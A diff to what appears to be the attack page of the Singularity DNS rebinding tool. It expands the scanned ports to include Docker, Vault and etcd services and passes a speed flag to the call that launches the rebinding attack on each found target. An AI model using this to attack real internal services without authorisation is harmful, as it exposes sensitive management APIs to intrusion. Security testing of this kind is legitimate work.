@@ -95,16 +95,18 @@
 
         // Specify a port range to scan and attack
         // WARNING: You must ensure that Singularity listens on all these ports at startup for now.
-        const portSpec = '80,8080-8090';
+        const portSpec = '80,8080-8082,2376,8200,3000,4000,2379,9333';
 
         // When scanning for services, we need to implement two callbacks:
         // scanFoundNewTargetCb() is invoked when a target was found to listen for HTTP requests on a given port.
         function scanFoundNewTargetCb(result) {
             console.log(result);
             document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
+
             // start DNS rebinding attack against target.
             // we double encode dash "-" if we send a CNAME for singularity to exploit instead of an IP address.
-            app.attackTarget(result.target.address.replace("-", "--"), result.target.port)
+            // last parameter is set to true to optimize for speed if frame match certain conditions
+            app.attackTarget(result.target.address.replace("-", "--"), result.target.port, true);
         }
 
         // scanDoneCb() is invoked when the scan was completed.
